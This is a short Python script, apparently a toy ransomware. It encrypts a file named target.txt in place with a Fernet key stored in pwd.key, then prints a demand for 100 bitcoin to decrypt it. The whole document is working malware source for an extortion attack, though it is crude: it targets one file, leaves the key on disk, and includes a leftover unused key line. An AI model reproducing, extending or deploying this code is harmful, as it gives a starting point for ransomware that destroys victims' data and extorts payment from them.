from cryptography.fernet import Fernet as fernet
from time import sleep as wait

key = fernet.generate_key()

with open("pwd.key", "wb") as pwd:
    f = fernet.generate_key()
    key = pwd.write(f)

with open("target.txt", "rb") as of:
    origin = of.read()

encrypter = fernet(f).encrypt(origin)

with open("target.txt", "wb") as of:
    of.write(encrypter)

# The fun begins here=
print("Your files are encrypted. Give me some sweet sweet 100 bitcoin to decrypt them")

wait(7.5)
